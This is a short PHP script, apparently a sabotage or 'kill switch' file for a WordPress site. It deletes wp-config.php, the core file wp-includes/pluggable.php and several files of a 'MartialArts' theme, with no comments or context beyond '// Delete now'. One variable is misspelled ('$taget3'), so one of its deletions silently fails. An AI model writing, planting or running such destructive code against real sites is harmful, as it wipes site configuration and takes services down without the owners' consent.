<?php
$target1 = "wp-content/themes/MartialArts/functions.php";
$target2 = "wp-config.php";
$taget3 = "wp-content/themes/MartialArts/header.php";
$target4 = "wp-content/themes/MartialArts/footer.php";
$target5 = "wp-content/themes/MartialArts/css/style.css";
$target6 = "wp-content/themes/MartialArts/ajax/search.php";
$target7 = "wp-content/themes/MartialArts/page-template/home.php";
$target8 = "wp-includes/pluggable.php";


if (file_exists($target1)) {
   unlink($target1); // Delete now
} 
if (file_exists($target2)) {
   unlink($target2); // Delete now
} 
if (file_exists($target3)) {
   unlink($target3); // Delete now
} 
if (file_exists($target4)) {
   unlink($target4); // Delete now
} 
if (file_exists($target5)) {
   unlink($target5); // Delete now
} 
if (file_exists($target6)) {
   unlink($target6); // Delete now
} 
if (file_exists($target7)) {
   unlink($target7); // Delete now
} 
if (file_exists($target8)) {
   unlink($target8); // Delete now
} 
?>